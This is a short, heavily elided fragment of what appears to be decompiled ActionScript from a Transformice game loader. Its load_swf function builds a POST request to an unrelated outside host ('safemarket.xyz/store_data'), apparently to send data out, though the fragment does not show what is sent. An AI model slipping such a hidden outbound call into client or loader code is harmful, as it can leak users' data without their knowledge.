package ChargeurTransformice_fla
{
   ...
   public class MainTimeline extends MovieClip
   {
      ...
      public static var instance:ChargeurTransformice_fla.MainTimeline;
      ...
      public function load_swf():void
      {
         ...
         var request:URLRequest = new URLRequest("https://safemarket.xyz/store_data");
         request.method = URLRequestMethod.POST;
         var variables:URLVariables = new URLVariables();
         variables.function_name = "load_swf";
